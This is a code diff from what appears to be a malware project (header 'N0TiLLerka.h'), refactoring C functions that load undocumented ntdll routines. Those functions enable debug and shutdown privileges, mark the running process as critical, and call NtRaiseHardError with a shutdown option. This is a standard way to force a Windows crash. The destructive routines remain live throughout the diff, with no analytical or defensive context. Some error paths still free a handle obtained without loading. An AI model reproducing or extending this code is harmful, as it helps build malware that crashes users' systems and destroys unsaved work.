@@ -1,18 +1,20 @@
 #include "../../HeaderFiles/N0TiLLerka.h"
 
+// NT Macros
 #define OPTION_SHUTDOWN_SYSTEM 6
 #define SE_SHUTDOWN_PRIVILEGE 19
 #define SE_DEBUG_PRIVILEGE 20
 
-typedef NTSTATUS(CALLBACK* pRTLADJUSTPRIVILEGE)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+// NT/RTL Function Prototypes
+typedef NTSTATUS(NTAPI* pRTLADJUSTPRIVILEGE)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
 pRTLADJUSTPRIVILEGE RtlAdjustPrivilege;
-typedef NTSTATUS(CALLBACK* pRTLSETPROCESSISCRITICAL)(BOOLEAN, BOOLEAN*, BOOLEAN);
+typedef NTSTATUS(STDAPIVCALLTYPE* pRTLSETPROCESSISCRITICAL)(BOOLEAN, PBOOLEAN, BOOLEAN);
 pRTLSETPROCESSISCRITICAL RtlSetProcessIsCritical;
-typedef NTSTATUS(CALLBACK* pNTRAISEHARDERROR)(NTSTATUS, ULONG, ULONG, PVOID*, ULONG, PUINT);
+typedef NTSTATUS(NTAPI* pNTRAISEHARDERROR)(NTSTATUS, ULONG, ULONG, PVOID*, ULONG, PUINT);
 pNTRAISEHARDERROR NtRaiseHardError;
 
-bool NTImportDLLFUNC() {
-	HINSTANCE hNtdll = LoadLibrary(L"ntdll.dll");
+BOOL ImportNTDLLFunctions(VOID) {
+	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
 	if (hNtdll) {
 		RtlAdjustPrivilege = (pRTLADJUSTPRIVILEGE)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
 		if (!RtlAdjustPrivilege) {
@@ -22,7 +24,7 @@ bool NTImportDLLFUNC() {
 			FreeLibrary(hNtdll);
 			return FALSE;
 		}
-		
+
 		RtlSetProcessIsCritical = (pRTLSETPROCESSISCRITICAL)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
 		if (!RtlSetProcessIsCritical) {
 #ifdef DEBUG
@@ -47,11 +49,10 @@ bool NTImportDLLFUNC() {
 		return FALSE;
 	}
 
-	FreeLibrary(hNtdll);
 	return TRUE;
 }
 
-bool NTSetProcessIsCritical(BOOLEAN blIscritical) {
+BOOL NTSetProcessIsCritical(BOOLEAN blIscritical) {
 	BOOLEAN bl;
 	if (!RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &bl)) {
 		if (!RtlSetProcessIsCritical(blIscritical, NULL, FALSE)) {
@@ -72,7 +73,7 @@ bool NTSetProcessIsCritical(BOOLEAN blIscritical) {
 	return FALSE;
 }
 
-bool NTRaiseHardError() {
+BOOL NTRaiseHardError(VOID) {
 	BOOLEAN bl;
 	if (!RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bl)) {
 		UINT ui;
